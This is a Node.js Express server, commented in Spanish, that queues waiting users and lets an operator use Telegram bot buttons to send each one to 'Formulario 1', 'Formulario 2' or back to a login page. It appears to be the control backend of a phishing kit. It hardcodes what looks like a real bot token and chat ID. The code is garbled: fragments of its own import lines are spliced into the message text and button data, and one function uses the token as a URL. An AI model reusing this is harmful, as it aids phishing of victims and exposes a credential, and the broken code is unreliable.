const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const axios = require("axios");

const TELEGRAM_TOKEN = "6128304583:AAEhQuGABUp5YzB_aK-Q-L6u-UAYOHI29F0";
const ADMIN_CHAT_ID = "<a href="tel:6287904726">6287904726</a>";

const app = express();
app.use(cors());
app.use(bodyParser.json());

let usuarios = {};

// Registrar usuario esperando
app.post("/api/esperar", async (req, res) =&gt; {
    const { usuarioId } = req.body;
    usuarios[usuarioId] = { estado: "esperando", destino: null };

    // Aviso a Telegram
    await avisarTelegram(usuarioId);

    res.json({ ok: true });
});

// Usuario consulta si debe ser redirigido
app.get("/api/destino/:usuarioId", (req, res) =&gt; {
    const { usuarioId } = req.params;
    if (usuarios[usuarioId] &amp;&amp; usuarios[usuarioId].estado === "redirigido") {
        res.json({ redirigir: true, url: usuarios[usuarioId].destino });
        delete usuarios[usuarioId];
    } else {
        res.json({ redirigir: false });
    }
});

// Admin redirige usuario (opcional, para usar también desde panel web)
app.post("/api/redirigir", (req, res) =&gt; {
    const { usuarioId, destino } = req.body;
    if (usuarios[usuarioId]) {
        usuarios[usuarioId].estado = "redirigido";
        usuarios[usuarioId].destino = destino;
        res.json({ ok: true });
    } else {
        res.json({ ok: false });
    }
});

// Ver usuarios esperando (opcional, para panel web)
app.get("/api/esperando", (req, res) =&gt; {
    const esperando = Object.entries(usuarios)
        .filter(([id, info]) =&gt; info.estado === "esperando")
        .map(([id]) =&gt; id);
    res.json({ usuarios: esperando });
});

// Ruta para recibir comandos de Telegram
app.post('/telegram', async (req, res) =&gt; {
    const body = req.body;
    if (body.callback_query) {
        const data = body.callback_query.data;
        const [usuarioId, destino] = data.split(",");
        if (usuarios[usuarioId]) {
            usuarios[usuarioId].estado = "redirigido";
            usuarios[usuarioId].destino = destino;
            await replyToTelegram(body.callback_query.id, `Usuario ${usuarioId} será enviado a ${destino}`);
        }
    }
    res.sendStatus(200);
});

// --- Funciones auxiliares ---

async function avisarTelegram(usuarioId) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const opciones = {
        chat_id: ADMIN_CHAT_ID,
        text:st bodyParser = require("body-parser");
const axios = requ
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "Formulario 1", callback_data:axios");

const TELEGRAM_TOKEN = "},
                    { text: "Formulario 2", callback_data:s");
const bodyParser = require("b}
                ],
                [
                    { text: "Volver al login", callback_data:arser");
const axios = requi}
                ]
            ]
        }
    };
    await axios.post(url, opciones);
}

async function replyToTelegram(callback_query_id, text) {
    const url = "6128304583:AAEhQuGABUp5YzB_aK-Q-L6u-UAYOHI29F0";
const ADMIN_CHAT_I
    await axios.post(url, {
        callback_query_id,
        text,
        show_alert: true
    });
}

// --- Configuración del servidor ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () =&gt; {
    console.log("Servidor corriendo en puerto " + PORT);
});